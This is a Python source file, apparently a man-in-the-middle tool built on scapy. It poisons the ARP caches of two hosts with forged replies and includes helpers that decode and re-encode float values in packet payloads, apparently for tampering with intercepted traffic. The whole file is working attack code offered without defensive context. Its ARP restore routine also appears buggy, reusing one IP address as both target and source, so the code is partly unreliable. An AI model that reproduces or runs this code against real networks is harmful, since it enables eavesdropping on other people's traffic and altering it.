import struct
import sys

from scapy.all import srp, send
from scapy.layers.l2 import Ether, ARP


def get_mac(an_ip):
    """
    This function translates an IP address to a MAC address

    :param an_ip: The IP address to translate
    """
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=an_ip)
    target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac

def launch_arp_poison(ip1, ip2):
    print("MITM 💻:", "[*] Launching arp poison ip1: " + ip1)
    print("MITM 💻:", "[*] Launching arp poison ip2: " + ip2)

    mac1 = get_mac(ip1)
    print("MITM 💻:", "[*] mac1: " + str(mac1))

    mac2 = get_mac(ip2)
    print("MITM 💻:", "[*] mac2: " + str(mac2))

    spoof_arp_cache(ip1, mac1, ip2)
    spoof_arp_cache(ip2, mac2, ip1)
    print("MITM 💻:", "[*] Network poisoned")

def spoof_arp_cache(target_ip, target_mac, source_ip):
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)

def restore_arp(ip1, ip2):
    print("MITM 💻:", "[*] Launching arp restore ip1: " + ip1)
    print("MITM 💻:", "[*] Launching arp restore ip2: " + ip2)

    mac1 = get_mac(ip1)
    print("MITM 💻:", "[*] mac1: " + str(mac1))

    mac2 = get_mac(ip2)
    print("MITM 💻:", "[*] mac2: " + str(mac2))

    packet = ARP(op=2, pdst=ip1, hwdst=mac1, psrc=ip2, hwsrc=mac2)
    send(packet, verbose=False)

    packet = ARP(op=2, pdst=ip1, hwdst=mac2, psrc=ip1, hwsrc=mac1)
    send(packet, verbose=False)

def translate_payload_to_float(raw_payload):
    """
    This function will convert a raw packet payload to a float number

    :param raw_payload: The payload to convert
    """
    # Handle endianness with the payload
    ordered_payload = raw_payload[5] + raw_payload[4] + raw_payload[3] + raw_payload[2]
    # Encode as HEX
    hex_value = ordered_payload.encode("hex")
    # Convert HEX into float
    float_value = struct.unpack('!f', hex_value.decode('hex'))[0]
    return float_value


def translate_float_to_payload(float_value, header_0, header_1):
    """
    This function will convert a float number to a raw package payload

    :param float_value: The float number to convert
    :param header_0: The first header to include in the payload
    :param header_1: The second header to include in the payload
    """
    # Convert to hex again
    hex_value = hex(struct.unpack('<I', struct.pack('<f', float_value))[0])
    # Decode as string
    string_decode = hex_value[2:].decode("hex")
    # Re arrange for endianness. This is a string
    payload = header_0 + header_1 + string_decode[-1] + string_decode[-2] + string_decode[-3] + string_decode[0]
    return payload